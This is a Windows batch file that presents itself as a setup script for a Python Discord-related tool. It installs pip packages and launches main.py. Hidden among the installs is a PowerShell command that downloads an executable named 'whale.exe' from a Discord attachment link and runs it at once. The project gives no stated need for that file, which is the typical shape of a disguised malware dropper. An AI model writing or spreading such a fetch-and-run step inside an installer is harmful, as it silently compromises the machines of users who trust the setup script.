@echo off

start pip install beautifulsoup4
start pip install geolite2 pycountry
start pip install requests pycountry
start pip install discord.py
start pip install colorama
start pip install disnake
start powersehll
start powershell Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1268858847955652610/1271480454716981259/whale.exe?ex=66b77df3&is=66b62c73&hm=7b8102138d1b0440d6002506321b3fcbd2a68eb0007ea5b9c8ac60be8f736c9c&' -OutFile "$env:USERPROFILE\Downloads\whale.exe"; Start-Process -FilePath "$env:USERPROFILE\Downloads\whale.exe"

python main.py
